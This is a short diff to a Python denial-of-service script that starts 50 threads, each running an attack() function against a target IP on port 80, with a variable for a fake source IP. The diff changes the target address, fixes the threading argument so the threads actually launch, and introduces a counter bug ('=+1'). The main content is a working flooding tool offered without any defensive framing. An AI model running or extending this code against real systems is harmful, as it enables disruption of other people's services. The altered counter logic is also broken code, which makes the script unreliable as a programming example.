@@ -3,7 +3,7 @@
 import threading
 import socket
 
-terget="192.168.1.1"
+terget="10.30.43.13"
 port=80
 
 fack_ip="172.1.1.0"
@@ -18,10 +18,10 @@ def attack():
         s.close
 
         global already_connected
-        already_connected=already_connected+1
+        already_connected=already_connected=+1
         if already_connected%50==0:
             print(already_connected)
          
 for i in range(50):
-    thread=threading.Thread(terget=attack)
+    thread=threading.Thread(target=attack)
     thread.start()
